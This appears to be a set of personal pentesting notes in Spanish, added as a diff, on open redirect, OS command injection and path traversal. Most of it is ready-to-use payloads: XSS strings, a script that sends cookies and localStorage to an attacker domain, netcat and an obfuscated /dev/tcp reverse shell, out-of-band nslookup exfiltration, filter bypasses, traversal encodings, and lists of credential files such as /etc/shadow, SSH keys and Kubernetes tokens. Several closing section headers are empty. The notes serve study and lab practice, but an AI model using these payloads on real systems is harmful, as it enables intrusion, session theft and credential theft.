@@ -1,0 +1,644 @@
+#### OPEN REDIRECT ####
+
+diferentes tipos:
+---------------------------
+1 open redirect : "reflejado"
+2 open redirect : "almacenado"
+3 open redirect : "DOOM"
+----------------------------
+PARAMETROS :
+
+/{payload}
+?next={payload}
+?url={payload}
+?target={payload}
+?rurl={payload}
+?dest={payload}
+?destination={payload}
+?redir={payload}
+?redirect_uri={payload}
+?redirect_url={payload}
+?redirect={payload}
+/redirect/{payload}
+/cgi-bin/redirect.cgi?{payload}
+/out/{payload}
+/out?{payload}
+?view={payload}
+/login?to={payload}
+?image_url={payload}
+?go={payload}
+?return={payload}
+?returnTo={payload}
+?return_to={payload}
+?checkout_url={payload}
+?continue={payload}
+?return_path={payload}
+success=https://c1h2e1.github.io
+data=https://c1h2e1.github.io
+qurl=https://c1h2e1.github.io
+login=https://c1h2e1.github.io
+logout=https://c1h2e1.github.io
+ext=https://c1h2e1.github.io
+clickurl=https://c1h2e1.github.io
+goto=https://c1h2e1.github.io
+rit_url=https://c1h2e1.github.io
+forward_url=https://c1h2e1.github.io
+@https://c1h2e1.github.io
+forward=https://c1h2e1.github.io
+pic=https://c1h2e1.github.io
+callback_url=https://c1h2e1.github.io
+jump=https://c1h2e1.github.io
+jump_url=https://c1h2e1.github.io
+click?u=https://c1h2e1.github.io
+originUrl=https://c1h2e1.github.io
+origin=https://c1h2e1.github.io
+Url=https://c1h2e1.github.io
+desturl=https://c1h2e1.github.io
+u=https://c1h2e1.github.io
+page=https://c1h2e1.github.io
+u1=https://c1h2e1.github.io
+action=https://c1h2e1.github.io
+action_url=https://c1h2e1.github.io
+Redirect=https://c1h2e1.github.io
+sp_url=https://c1h2e1.github.io
+service=https://c1h2e1.github.io
+recurl=https://c1h2e1.github.io
+j?url=https://c1h2e1.github.io
+url=//https://c1h2e1.github.io
+uri=https://c1h2e1.github.io
+u=https://c1h2e1.github.io
+allinurl:https://c1h2e1.github.io
+q=https://c1h2e1.github.io
+link=https://c1h2e1.github.io
+src=https://c1h2e1.github.io
+tc?src=https://c1h2e1.github.io
+linkAddress=https://c1h2e1.github.io
+location=https://c1h2e1.github.io
+burl=https://c1h2e1.github.io
+request=https://c1h2e1.github.io
+backurl=https://c1h2e1.github.io
+RedirectUrl=https://c1h2e1.github.io
+Redirect=https://c1h2e1.github.io
+ReturnUrl=https://c1h2e1.github.io
+-------------------------------------------------
+inyecciones xss:
+%09Jav%09ascript:alert(document.domain)
+javascript://%250Alert(document.location=document.cookie)
+/%09/javascript:alert(1);
+/%09/javascript:alert(1)
+//%5cjavascript:alert(1);
+//%5cjavascript:alert(1)
+/%5cjavascript:alert(1);
+/%5cjavascript:alert(1)
+javascript://%0aalert(1)
+<>javascript:alert(1);
+//javascript:alert(1);
+//javascript:alert(1)
+/javascript:alert(1);
+/javascript:alert(1)
+\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
+javascript:alert(1);
+javascript:alert(1)
+javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
+javascript:confirm(1)
+javascript://https://whitelisted.com/?z=%0Aalert(1)
+javascript:prompt(1)
+jaVAscript://whitelisted.com//%0d%0aalert(1);//
+javascript://whitelisted.com?%a0alert%281%29
+/x:1/:///%01javascript:alert(document.cookie)/
+";alert(0);//
+----------------------------------------------------
+¿Cómo encontrar puntos de entrada para realizar la prueba?
+
+Historial de Burp Proxy y mapa del sitio de Burp (consulte las URL con parámetros)
+Google tonto. P.ej:inurl:redirectUrl=http site:target.com
+Funcionalidades habitualmente asociadas a las redirecciones:
+Páginas de inicio de sesión, 
+cierre de sesión, 
+registro y 
+restablecimiento de contraseña
+Cambiar idioma del sitio
+Enlaces en correos electrónicos
+Leer código JavaScript
+fuerza bruta
+Busque parámetros de redireccionamiento ocultos, por ejemplo:
+/redirect?url={payload}&next={payload}&redirect={payload}&redir={payload}&rurl={payload}&redirect_uri={payload}
+/?url={payload}&next={payload}&redirect={payload}&redir={payload}&rurl={payload}&redirect_uri={payload}
+
+Respuestas a buscar al hacer confusión 
+Códigos de estado de redireccionamiento HTTP
+
+300 opciones múltiples : 
+esto indica que la solicitud tiene más de una respuesta posible. El cliente deberá elegir uno de ellos.
+
+301 Movido Permanentemente : 
+esto significa que el recurso solicitado se ha movido permanentemente a la URL proporcionada por los encabezados de Ubicación. Todas las solicitudes futuras deben utilizar el nuevo URI.
+
+302 encontrado:
+este código de respuesta significa que el recurso solicitado se ha movido temporalmente a la URL proporcionada por los encabezados de Ubicación. A diferencia del 301, no significa que el recurso se haya movido permanentemente, solo que está ubicado temporalmente en otro lugar
+
+303 Ver Otros:
+el servidor envía esta respuesta para indicarle al cliente que obtenga el recurso solicitado en otro URI con una solicitud GET.
+
+304 No modificado:
+se utiliza para fines de almacenamiento en caché. Le dice al cliente que la respuesta no ha sido modificada, por lo que el cliente puede continuar usando la misma versión almacenada en caché de la respuesta.
+
+305 Usar proxy;
+se debe acceder al recurso solicitado a través de un proxy proporcionado en el encabezado Ubicación.
+
+307 Redirección Temporal:
+esto significa que el recurso solicitado se ha movido temporalmente a la URL proporcionada por los encabezados de Ubicación y las solicitudes futuras aún deben usar el URI original.
+
+308 Redirección Permanente:
+esto significa que el recurso se ha movido permanentemente a la URL proporcionada por los encabezados de Ubicación y las solicitudes futuras deben utilizar el nuevo URI. Es similar al 301 pero no permite cambiar el método HTTP.
+
+Aparece un cuadro de alerta
+----------------------------------------------------
+mirar para mas bypass diferentes
+https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect
+------------------------------------------------------------
+Consejos:
+--------
+Intente usar el mismo parámetro dos veces:?next=whitelisted.com&next=google.com
+Si se filtran períodos, utilice una dirección IPv4 en notación decimal http://www.geektools.com/geektools-cgi/ipconv.cgi
+Pruebe una versión de cargas útiles codificadas con URL doble y triple
+Intente redirigir a una dirección IP (en lugar de un dominio) usando notaciones diferentes : IPv6, IPv4 en decimal, hexadecimal u octal.
+Para XSS, intente reemplazar alerta(1) con mensaje(1) y confirmar(1)
+Si la extensión está marcada, intente?image_url={payload}/.jpg
+Pruebe target.com/?redirect_url=.uk(o [any_param]=.uk). Si redirige a target.com.uk, ¡entonces es vulnerable! target.com.uk y target.com son dominios diferentes.
+Utilice /U+e280 ANULACIÓN DE DERECHA A IZQUIERDA:https://whitelisted.com@%E2%80%AE@moc.elgoog
+El carácter Unicode U+202E cambia todo el texto posterior para que sea de derecha a izquierda
+
+---------------------------------------------------
+Explotación :
+Suplantación de identidad
+Encadenando redirección abierta con
+SSRF
+Divulgación del token de OAuth
+XSS
+Inyección CRLF
+--------------------------------------------------
+
+ejemplos : de robar cookies de sesiones :
+https://example.com/proxy.php?link=%3Cscript%3Eimage%20%3D%20new%20Image%28%29%3B%20image.src%3D%22https%3A%2F%2Fcollectionexample.com%2F%3Fc%3D%22%2Bdocument.cookie%2B%22ls%3D%22%2BJSON.stringify%28localStorage%29%3B%3C%2Fscript%3E
+
+    La versión decodificada de la URL:
+
+https://example.com/proxy.php?link=<script>image = new Image();
+image.src="https://collectionexample.com/?c="+document.cookie+"ls="+JSON.stringify(localStorage);
+</script>
+
+
+    En este ejemplo, el navegador del usuario aceptará todas las cookies disponibles y la información almacenada a nivel local sobre example.com y la enviará al dominio controlado por el ciberdelincuente, collectionexample.com.
+
+    
+• Malware
+
+    La distribución de malware a través de redireccionamientos abiertos es muy similar a la suplantación de identidad; la única diferencia es que el destino final es un archivo malicioso en lugar de una página impostora:
+
+https://buenejemplo.example.com/exit.asp?
+url=https%3A%2F%2Fmalwareejemplo.com/documento.pdf
+
+------------------------------------------------------------
+todos los laboratorios para practicar:
+https://github.com/blabla1337/skf-labs
+porwsuiguer lab DOOM
+-----------------------------------------------------------
+--CARGA ÚTILES DE VARIOS VUNLN:
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect
+----------------------------------------------------------
+
+
+Encuentre cada caso de redirección que ocurra en la aplicación.
+Busque el código de estado 3xx y un encabezado de Ubicación
+HTTP/1.1 302 Object moved
+Location: https://mysafedomain.com/
+
+---------------------------------------------------
+Utilice el encabezado de actualización para recargar la página con una URL arbitraria después de un intervalo fijo; puede establecer el intervalo en 0 para activar una redirección inmediata.
+HTTP/1.1 200 OK
+Refresh: 0;
+url=http://mysafedomain.com/index.html
+
+-------------------------------------------------------
+open redirect DOOM:
+>document.location
+>document.URL
+>document.open()
+>window.location.href
+>window.navigate()
+>window.open()
+
+-----------------------------------------
+open redirect html:
+Verifique las etiquetas HTML <meta> para replicar el comportamiento de cualquier encabezado HTTP y realizar redirección.
+HTTP/1.1 200 OK
+Content-Length: 123
+<html>
+<head>
+<meta http-equiv=”refresh” content=”0;
+url=http://mysafedomain.com/index.html>
+</head>
+</html>
+-----------------------------------------------
+open redirct APIS:
+Verifique las API dentro de JavaScript para redirigir el navegador a una URL arbitraria.
+HTTP/1.1 200 OK
+Content-Length: 123
+<html>
+<head>
+<script>
+document.location=”http://mysafedomain.com/index.html";
+</script>
+</head>
+</html>
+--------------------------------------------------
+Abrir redirección cargando archivos svg:
+
+<code>
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<svg
+onload="window.location='http://www.example.com'"
+xmlns="http://www.w3.org/2000/svg">
+</svg>
+</code>
+
+-----------------------------------------------------------
+
+
+
+### injection comandos ####
+tipos de inyecciones de comandos:
+1- simple 
+
+2- ciegas retraso de tiempo pero agregando otro operador logico ejemplo email&||whoami|| o sino  || ping -c14 ip || -c14 es simplemente el tiempo de espera
+
+3- ciegas con rediccionamiento de salida: inyectas el comando a ciejas con retraso de tiempo y creas una carpeta .txt y lo llamas en otro parametro dentro d euna carpeta  que se este utilizando .
+
+4-Inyección ciega de comandos del sistema operativo con interacción fuera de banda"   & nslookup kgji2ohoyw.web-attacker.com &
+
+5-Inyección ciega de comandos del sistema operativo con exfiltración de datos fuera de banda
+----------------------------------------------------------------------------------------------------------
+?cmd={payload}
+?exec={payload}
+?command={payload}
+?execute{payload}
+?ping={payload}
+?query={payload}
+?jump={payload}
+?code={payload}
+?reg={payload}
+?do={payload}
+?func={payload}
+?arg={payload}
+?option={payload}
+?load={payload}
+?process={payload}
+?step={payload}
+?read={payload}
+?function={payload}
+?req={payload}
+?feature={payload}
+?exe={payload}
+?module={payload}
+?payload={payload}
+?run={payload}
+?print={payload}
+---------------------------------------------
+ En el primer paso, el atacante debe inspeccionar el funcionamiento de la aplicación web para encontrar posibles puntos de inyección.
+
+datos no seguros proporcionados por el usuario (formularios, cookies,buscador, encabezados HTTP,comentarios, parámetros si no funciona en uno probar en otro etc.) a un shell del sistema.
+
+------------------------------------------------------
+nc -lvnp 443 conexcion 
+ escucha : nc ip del servidor 443 -e /bin/bash
+
+atacante escucha : nc -vv -l -p 8080
+victima : nc- e /bash/sh ip de la victima 8080
+ subir una shell en bash , python ,perl ,php,netcat
+---------------------------------------------------------
+comandos para windows y linux:
+
+Varios caracteres funcionan como separadores de comandos, lo que permite encadenar comandos. Los siguientes separadores de comandos funcionan tanto en sistemas basados ​​en Windows como en Unix:
+
+&
+&&
+|
+||
+
+Los siguientes separadores de comandos funcionan sólo en sistemas basados ​​en Unix:
+
+;
+Nueva línea ( 0x0ao \n)
+
+En sistemas basados ​​en Unix, también puede utilizar comillas invertidas o el carácter de dólar para realizar la ejecución en línea de un comando inyectado dentro del comando original:
+
+`
+comando inyectado`
+$(
+comando inyectado)
+
+#Both Unix and Windows supported
+ls||id; ls ||id; ls|| id; ls || id # Execute both
+ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
+ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
+ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
+ls %0A id # %0A Execute both (RECOMMENDED)
+
+#Only unix supported
+`ls` # ``
+$(ls) # $()
+ls; id # ; Chain commands
+ls${LS_COLORS:10:1}${IFS}id # Might be useful
+
+#Not executed but may be interesting
+> /var/www/html/out.txt #Try to redirect the output to a file
+< /etc/passwd #Try to send some input to the command
+ ------------------------------------------------------
+Extracción de datos: carácter por carácter
+
+Copiar
+swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
+real    0m5.007s
+user    0m0.000s
+sys 0m0.000s
+
+swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
+real    0m0.002s
+user    0m0.000s
+sys 0m0.000s
+-----------------------------------------------------
+Herramientas en línea para comprobar la filtración de datos basada en DNS:
+
+dnsbin.zhack.ca
+
+pingb.in
+--------------------------------------------------------------
+bypass :
+
+windows: 
+powershell C:**2\n??e*d.*? # notepad
+@^p^o^w^e^r^shell c:**32\c*?c.e?e # calc
+
+linux:
+echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
+cat ${HOME:0:1}etc${HOME:0:1}passwd 
+Bypass IPs
+
+# Decimal IPs
+127.0.0.1 == 2130706433
+ ----------------------------------------------------
+ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
+ mirar bypass otras cosas comando inyections
+ ----------------------------------------------------
+
+
+
+
+### PATH TRANVERSAL ##########
+
+
+tipos de ataques:
+
+1- Recorrido de ruta de archivo, caso simple
+
+2- Recorrido de ruta de archivo, secuencias transversales    bloqueadas con omisión de ruta absoluta
+
+3- Recorrido de ruta de archivo, secuencias transversales eliminadas de forma no recursiva
+
+4- Recorrido de ruta de archivo, secuencias transversales eliminadas con decodificación de URL superflua
+
+5- Recorrido de ruta de archivo, validación del inicio de ruta
+
+6- Recorrido de ruta de archivo, validación de extensión de archivo con omisión de bytes nulos
+
+-----------------------------------------------------
+¿Cómo buscar la inclusión de archivos locales?----
+
+
+Encontrar la vulnerabilidad Path Traversal es bastante fácil; para encontrar dicha vulnerabilidad, uno debe poder realizar las siguientes tareas.
+
+Enumerar funciones de inclusión
+Pruebe las funciones de inclusión enumeradas
+Bueno, ¿cómo se puede enumerar la función de inclusión? Es fácil, solo necesita tener en mente la siguiente pregunta.
+
+¿Dónde están las funciones de inclusión o los parámetros relacionados con el archivo en la URL o el cuerpo de la solicitud?
+¿Si puede ver una extensión de archivo inusual en la URL o en el cuerpo de la solicitud?
+
+¿Existen parámetros de solicitud que podrían usarse para operaciones relacionadas con archivos?
+¿Existen extensiones de archivo inusuales?
+¿Hay nombres de variables interesantes?
+http://example.com/getUserProfile.jsp?item=ikki.html
+http://example.com/index.php?file=content
+http://example.com/main.cgi?home=index.htm
+¿Es posible identificar las cookies utilizadas por la aplicación web para la generación dinámica de páginas o plantillas?
+Cookie: ID=d9ccd3f4f9f18cc1:TM=2166255468:LM=1162655568:S=3cFpqbJgMSSPKVMV:TEMPLATE=flower
+Cookie: USER=1826cc8f:PSTYLE=GreenDotRed
+
+Prueba de LFI en el caso de prueba de cookies -5
+-----------------------------------------------------
+
+1- Recorrido de ruta de archivo, caso simple
+
+
+
+
+----------------------------------------------------
+Cada sistema operativo tiene un separador de ruta diferente.
+
+Ejemplo
+
+Unix/Linux
+
+Directorio raíz: "/"
+
+Separador de directorio: “/”
+
+ventanas
+
+Directorio raíz: “<letra de unidad>:\”
+
+Separador de directorio: “\”
+----------------------------------------------------
+
+Podemos usar los ..caracteres para acceder al directorio principal; las siguientes cadenas son varias codificaciones que pueden ayudarlo a evitar un filtro mal implementado.
+
+../
+..\
+..\/
+%2e%2e%2f
+%252e%252e%252f
+%c0%ae%c0%ae%c0%af
+%uff0e%uff0e%u2215
+%uff0e%uff0e%u2216
+
+%2e%2e%2f representa ../
+%2e%2e/ representa ../
+..%2f representa ../ 
+%2e%2e%5c representa ..\
+%2e%2e\ representa ..\ 
+..%5c representa ..\ 
+%252e%252e%255c representa ..\ 
+..%255c representa ..\ 
+
+Codificación Unicode de 16 bits
+. = %u002e
+/ = %u2215
+\ = %u2216
+Codificación UTF-8 Unicode
+. = %c0%2e, %e0%40%ae, %c0ae
+/ = %c0%af, %e0%80%af, %c0%2f
+\ = %c0%5c, %c0%80%5c
+Omitir "../" reemplazado por ""
+A veces te encuentras con un WAF que elimina los ../caracteres de las cadenas, simplemente los duplica.
+
+..././
+...\.\
+
+Omita "../" con ";"
+..;/
+http://domain.tld/page.jsp?include=..;/..;/sensitive.txt 
+Codificación de URL doble
+. = %252e
+/ = %252f
+\ = %255c
+Omisión UNC
+Un atacante puede inyectar un recurso compartido UNC de Windows ('\UNC\share\name') en un sistema de software para redirigir potencialmente el acceso a una ubicación no deseada o a un archivo arbitrario.
+
+\\localhost\c$\windows\win.ini
+Derivación de NGINX/ALB
+NGINX en ciertas configuraciones y ALB pueden bloquear ataques transversales en la ruta, por ejemplo: http://nginx-server/../../devolverá una solicitud 400 incorrecta.
+
+Para evitar este comportamiento, simplemente agregue barras diagonales delante de la URL: http://nginx-server////////../../
+
+Omisión sin cookies de ASPNET
+Cuando el estado de sesión sin cookies está habilitado. En lugar de depender de una cookie para identificar la sesión, ASP.NET modifica la URL incrustando el ID de sesión directamente en ella.
+
+Por ejemplo, una URL típica podría transformarse de: http://example.com/page.aspxa algo como: http://example.com/(S(lit3py55t21z5v55vlm25s55))/page.aspx. El valor dentro (S(...))es el ID de sesión.
+
+Podemos utilizar este comportamiento para omitir las URL filtradas.
+
+/admin/(S(X))/main.aspx
+/admin/Foobar/(S(X))/../(S(X))/main.aspx
+/(S(X))/admin/(S(X))/main.aspx
+Omisión de Java
+Omitir el protocolo URL de Java
+
+url:file:///etc/passwd
+url:http://127.0.0.1:8080
+
+Las siguientes URL muestran ejemplos de explotación de archivos de contraseñas *NIX.
+
+http://some_site.com.br/../../../../etc/shadow
+http://some_site.com.br/get-files?file=/etc/passwd
+Nota: En un sistema Windows, un atacante puede navegar solo en una partición que ubique la raíz web, mientras que en Linux puede navegar en todo el disco.
+
+En muchos sistemas operativos, %00se pueden inyectar bytes nulos para terminar el nombre del archivo. Por ejemplo, enviando un parámetro como:
+
+?file=secret.doc%00.pdf
+
+hará que la aplicación Java vea una cadena que termina en ".pdf" y el sistema operativo verá un archivo que termina en ".doc". Los atacantes pueden utilizar este truco para eludir las rutinas de validación.
+
+Codificación porcentual (también conocida como codificación de URL)
+Tenga en cuenta que los contenedores web realizan un nivel de decodificación en valores porcentuales codificados de formularios y URL.
+
+..%c0%af representa ../ 
+..%c1%9c representa ..\ 
+-------------------------------------------------------
+Recorrido de ruta
+Archivos interesantes de Linux
+/etc/issue
+/etc/passwd
+/etc/shadow
+/etc/group
+/etc/hosts
+/etc/motd
+/etc/mysql/my.cnf
+/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
+/proc/self/environ
+/proc/version
+/proc/cmdline
+/proc/sched_debug
+/proc/mounts
+/proc/net/arp
+/proc/net/route
+/proc/net/tcp
+/proc/net/udp
+/proc/self/cwd/index.php
+/proc/self/cwd/main.py
+/home/$USER/.bash_history
+/home/$USER/.ssh/id_rsa
+/run/secrets/kubernetes.io/serviceaccount/token
+/run/secrets/kubernetes.io/serviceaccount/namespace
+/run/secrets/kubernetes.io/serviceaccount/certificate
+/var/run/secrets/kubernetes.io/serviceaccount
+/var/lib/mlocate/mlocate.db
+/var/lib/plocate/plocate.db
+/var/lib/mlocate.db
+Archivos interesantes de Windows.
+Archivo siempre existente en una máquina Windows reciente. Ideal para probar el recorrido del camino, pero no hay mucho interés en el interior...
+
+c:\windows\system32\license.rtf
+c:\windows\system32\eula.txt
+
+c:/boot.ini
+c:/inetpub/logs/logfiles
+c:/inetpub/wwwroot/global.asa
+c:/inetpub/wwwroot/index.asp
+c:/inetpub/wwwroot/web.config
+c:/sysprep.inf
+c:/sysprep.xml
+c:/sysprep/sysprep.inf
+c:/sysprep/sysprep.xml
+c:/system32/inetsrv/metabase.xml
+c:/sysprep.inf
+c:/sysprep.xml
+c:/sysprep/sysprep.inf
+c:/sysprep/sysprep.xml
+c:/system volume information/wpsettings.dat
+c:/system32/inetsrv/metabase.xml
+c:/unattend.txt
+c:/unattend.xml
+c:/unattended.txt
+c:/unattended.xml
+c:/windows/repair/sam
+c:/windows/repair/system
+Los siguientes archivos de registro son controlables y se pueden incluir con una carga útil maligna para lograr la ejecución de un comando.
+
+Los siguientes archivos de registro son controlables y se pueden incluir con una carga útil maligna para lograr la ejecución de un comando.
+
+/var/log/apache/access.log
+/var/log/apache/error.log
+/var/log/httpd/error_log
+/usr/local/apache/log/error_log
+/usr/local/apache2/log/error_log
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+/var/log/vsftpd.log
+/var/log/sshd.log
+/var/log/mail
+
+
+------------------------------------------------------
+
+### LFI ################
+
+
+---------------------------------------------------
+
+###### RFI  ##############
+
+
+---------------------------------------------------
+
+### ENVENAMIENTO CACHE ####
+
+---------------------------------------------------
+
+### CORS  ##############
+### IDOR  ##############
+### CSRF  ##############
+### SSRF  ##############
+### COOKIES ####
